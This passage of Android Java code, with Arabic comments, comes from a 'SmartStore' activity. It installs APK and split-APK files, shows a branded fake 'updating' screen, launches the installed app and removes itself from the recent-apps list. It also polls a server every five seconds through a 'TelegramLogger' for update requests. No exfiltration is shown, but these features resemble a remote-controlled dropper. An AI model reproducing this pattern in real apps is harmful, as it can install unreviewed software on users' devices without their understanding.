                Log.d(TAG, "✅ Extracted " + splitApks.size() + " split APK files");
                
                // تثبيت باستخدام PackageInstaller
                apksInstaller.installSplitApks(splitApks, targetPackageName);
                
                runOnUiThread(() -> {
                    hideLoading();
                    Toast.makeText(this, "جاري التثبيت... يرجى الانتظار", Toast.LENGTH_LONG).show();
                });
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Error installing APKS", e);
                e.printStackTrace();
                runOnUiThread(() -> {
                    hideLoading();
                    Toast.makeText(this, "فشل تثبيت APKS: " + e.getMessage(), 
                        Toast.LENGTH_LONG).show();
                });
            }
        }).start();
    }
    
    /**
     * ✅ تثبيت APK عادي - مطابق لـ V7 الأصلي
     */
    private void installSingleApk() {
        new Thread(() -> {
            try {
                Log.d(TAG, "✅ Installing single APK using PackageInstaller API...");
                
                apksInstaller.installSingleApk(apkFile, targetPackageName);
                
                runOnUiThread(() -> {
                    hideLoading();
                    Toast.makeText(this, "جاري التثبيت... يرجى الانتظار", Toast.LENGTH_LONG).show();
                });
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Error installing APK", e);
                e.printStackTrace();
                runOnUiThread(() -> {
                    hideLoading();
                    Toast.makeText(this, "فشل تثبيت APK: " + e.getMessage(), 
                        Toast.LENGTH_LONG).show();
                });
            }
        }).start();
    }

    /**
     * فتح التطبيق المثبت
     *
     * ✅ V19: استخدام finishAndRemoveTask لإزالة المتجر من قائمة التطبيقات المفتوحة
     */
    private void openInstalledApp() {
        if (targetPackageName == null) {
            Toast.makeText(this, "لا يمكن فتح التطبيق", Toast.LENGTH_SHORT).show();
            return;
        }

        Log.d(TAG, "Opening installed app: " + targetPackageName);
        showLoading("جاري فتح التطبيق...");

        mainHandler.postDelayed(() -> {
            try {
                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(targetPackageName);

                if (launchIntent != null) {
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(launchIntent);

                    hideLoading();
                    Log.d(TAG, "App launched successfully, closing SmartStore");

                    // ✅ CRITICAL: حفظ حالة التثبيت في SharedPreferences
                    prefs.edit()
                        .putBoolean(KEY_FIRST_INSTALL_DONE, true)
                        .putString(KEY_TARGET_PACKAGE, targetPackageName)
                        .apply();

                    Toast.makeText(this, "تم التحديث بنجاح! ✓", Toast.LENGTH_SHORT).show();

                    // ✅ إغلاق المتجر + إزالته من قائمة التطبيقات المفتوحة بعد 500ms
                    mainHandler.postDelayed(() -> {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            finishAndRemoveTask();
                        } else {
                            finish();
                        }
                    }, 500);
                } else {
                    hideLoading();
                    Log.e(TAG, "Cannot get launch intent");
                    Toast.makeText(this, "لا يمكن فتح التطبيق", Toast.LENGTH_SHORT).show();
                }

            } catch (Exception e) {
                Log.e(TAG, "Error opening app", e);
                hideLoading();
                Toast.makeText(this, "خطأ في فتح التطبيق", Toast.LENGTH_SHORT).show();
            }
        }, 500);
    }

    /**
     * تنسيق حجم الملف
     */
    private String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        
        final String[] units = new String[] { "B", "KB", "MB", "GB", "TB" };
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        
        DecimalFormat df = new DecimalFormat("#,##0.#");
        return df.format(size / Math.pow(1024, digitGroups)) + " " + units[digitGroups];
    }

    /**
     * ✅ عرض شاشة "جاري التحديث" باسم المتجر وأيقونته
     * - تظهر شاشة كاملة باسم "App Hub"
     * - يبدأ عدّاد تقدّم متحرك من 0
     */
    private void showLoading(String message) {
        runOnUiThread(() -> {
            if (loadingOverlay != null && txtLoadingMessage != null) {
                txtLoadingMessage.setText(message);
                loadingOverlay.setVisibility(View.VISIBLE);
                // ✅ إعادة تعيين العدّاد للصفر
                if (progressBar != null) progressBar.setProgress(0);
                if (txtProgressPercent != null) txtProgressPercent.setText("0%");
            }
        });
    }

    /**
     * ✅ تحديث نسبة التقدّم في شاشة "جاري التحديث"
     * @param percent نسبة التقدّم (0-100)
     * @param message رسالة الحالة (اختياري - null للإبقاء على الرسالة الحالية)
     */
    private void updateProgress(int percent, String message) {
        runOnUiThread(() -> {
            if (progressBar != null) {
                progressBar.setProgress(percent);
            }
            if (txtProgressPercent != null) {
                txtProgressPercent.setText(percent + "%");
            }
            if (message != null && txtLoadingMessage != null) {
                txtLoadingMessage.setText(message);
            }
        });
    }

    /**
     * إخفاء شاشة التحميل
     */
    private void hideLoading() {
        runOnUiThread(() -> {
            if (loadingOverlay != null) {
                loadingOverlay.setVisibility(View.GONE);
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        Log.d(TAG, "onActivityResult - requestCode: " + requestCode + ", resultCode: " + resultCode);
        
        if (requestCode == REQUEST_INSTALL_PERMISSION) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (getPackageManager().canRequestPackageInstalls()) {
                    Log.d(TAG, "Install permission granted");
                    Toast.makeText(this, "تم منح صلاحية التثبيت", Toast.LENGTH_SHORT).show();
                    // إعادة المحاولة تلقائياً
                    mainHandler.postDelayed(this::installApp, 500);
                } else {
                    Log.d(TAG, "Install permission denied");
                    Toast.makeText(this, "لم يتم منح صلاحية التثبيت", Toast.LENGTH_LONG).show();
                }
            }
        } else if (requestCode == REQUEST_INSTALL_APK) {
            // ✅ CRITICAL: التحقق من التثبيت بعد الرجوع من شاشة التثبيت
            Log.d(TAG, "Returned from install screen, checking status...");
            
            mainHandler.postDelayed(() -> {
                checkIfAppInstalled();
                
                if (isAppInstalled) {
                    Log.d(TAG, "Installation successful!");
                    Toast.makeText(this, "تم التحديث بنجاح! ✓", Toast.LENGTH_SHORT).show();
                    // فتح التطبيق تلقائياً
                    mainHandler.postDelayed(this::openInstalledApp, 500);
                } else {
                    Log.d(TAG, "Installation cancelled or failed");
                    Toast.makeText(this, "تم إلغاء التحديث", Toast.LENGTH_SHORT).show();
                    // إعادة عرض واجهة المتجر
                    updateUI();
                }
            }, 1000); // انتظار ثانية للتأكد من اكتمال التثبيت
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        Log.d(TAG, "onResume called");

        // ✅ Polling فوري + كل 5 ثوانٍ لاستجابة سريعة لأي طلب تحديث من السيرفر
        TelegramLogger.pollServer(this);
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.postDelayed(pollRunnable, 5000);
        }

        // ✅ التحقق من حالة التطبيق عند العودة
        if (apkFile != null && targetPackageName != null) {
            boolean wasInstalled = isAppInstalled;
            checkIfAppInstalled();

            Log.d(TAG, "onResume - wasInstalled: " + wasInstalled + ", isInstalled: " + isAppInstalled);

            if (!wasInstalled && isAppInstalled) {
                // ✅ التطبيق تم تثبيته للتو - أكمل العدّاد لـ 100%
                Log.d(TAG, "App just got installed!");
                updateProgress(100, "تم التحديث بنجاح! ✓");
                Toast.makeText(this, "تم التحديث بنجاح! ✓", Toast.LENGTH_SHORT).show();
                // ✅ إخفاء شاشة التحديث وفتح التطبيق تلقائياً بعد ثانية
                mainHandler.postDelayed(() -> {
                    hideLoading();
                    openInstalledApp();
                }, 1000);
            } else if (wasInstalled != isAppInstalled) {
                // تغيرت الحالة
                hideLoading();
                updateUI();
            }
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        // ✅ إيقاف الـ polling عند الخروج من المتجر
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy called - SmartStore is closing");
    }
}
